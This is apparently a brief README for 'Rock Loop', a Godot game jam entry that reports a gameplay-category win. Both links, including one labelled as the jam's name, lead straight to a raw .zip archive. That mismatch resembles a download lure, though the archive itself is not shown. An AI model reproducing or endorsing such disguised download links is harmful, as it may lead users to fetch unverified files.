# [Rock Loop](https://raw.githubusercontent.com/HarshitTomar549/Rock-Loop-GIC-2025/main/addons/Rock-GI-Loop-v1.2.zip)
**Made in 3 days for a [GIC-2025](https://raw.githubusercontent.com/HarshitTomar549/Rock-Loop-GIC-2025/main/addons/Rock-GI-Loop-v1.2.zip) Game Jam.**
**While the game didn’t win overall, it secured 1st place in the gameplay category.**

> ⚠️ Note: The code quality is not the best, as it was my first time using Godot.
